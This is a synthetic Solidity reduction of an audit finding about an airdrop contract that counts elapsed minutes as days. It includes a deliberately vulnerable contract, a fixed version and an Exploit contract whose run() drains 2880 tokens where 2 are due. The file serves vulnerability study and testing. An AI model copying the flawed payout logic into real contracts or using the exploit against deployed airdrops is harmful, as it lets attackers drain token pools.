// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Devve withdrawAirdropTokens — tokensToWithdraw multiplies airdropTokensPerDay
    by elapsed minutes, not days (Zokyo, finding 37617).

    SYNTHETIC, cheatcode-free reduction. Two days have elapsed. The fair payout
    is 2 tokens. The contract pays 2 * 1440 = 2880 tokens. run() does not warp;
    the clock is the block timestamp already in force when the contract is built. */

contract AirdropToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Airdrop {
    uint256 public constant airdropTokensPerDay = 1 ether;
    AirdropToken public token;
    mapping(address => uint256) public lastWithdraw;
    uint256 public tokensToWithdraw;

    constructor(AirdropToken token_) {
        token = token_;
        token.mint(address(this), 2880 ether);
        lastWithdraw[msg.sender] = block.timestamp - 2 days;
    }

    function getCurrentAirdropBalance(address user) public view returns (uint256) {
        uint256 elapsed = block.timestamp - lastWithdraw[user];
        return airdropTokensPerDay * (elapsed / 60);
    }

    function withdrawAirdropTokens() external {
        uint256 elapsed = block.timestamp - lastWithdraw[msg.sender];
        // @> VULN: tokensToWithdraw multiplies airdropTokensPerDay by minutes, not days
        tokensToWithdraw = airdropTokensPerDay * (elapsed / 60);
        lastWithdraw[msg.sender] = block.timestamp;
        token.transfer(msg.sender, tokensToWithdraw);
    }
}

contract AirdropFixed {
    uint256 public constant airdropTokensPerDay = 1 ether;
    AirdropToken public token;
    mapping(address => uint256) public lastWithdraw;

    constructor(AirdropToken token_) {
        token = token_;
        token.mint(address(this), 2880 ether);
        lastWithdraw[msg.sender] = block.timestamp - 2 days;
    }

    function withdrawAirdropTokens() external {
        uint256 elapsed = block.timestamp - lastWithdraw[msg.sender];
        uint256 tokensToWithdraw = airdropTokensPerDay * (elapsed / 1 days);
        lastWithdraw[msg.sender] = block.timestamp;
        token.transfer(msg.sender, tokensToWithdraw);
    }
}

contract Exploit {
    uint256 public constant PAID = 2880 ether;
    uint256 public constant FAIR = 2 ether;
    uint256 public constant EXTRA = 2878 ether;

    AirdropToken public token;
    Airdrop public airdrop;
    uint256 public preview;
    uint256 public received;

    constructor() {
        token = new AirdropToken();
        airdrop = new Airdrop(token);
    }

    function run() external {
        preview = airdrop.getCurrentAirdropBalance(address(this));
        airdrop.withdrawAirdropTokens();
        received = token.balanceOf(address(this));
        require(preview == PAID, "preview");
        require(received == PAID, "received");
        require(received - FAIR == EXTRA, "extra");
        require(token.balanceOf(address(airdrop)) == 0, "pool empty");
    }
}
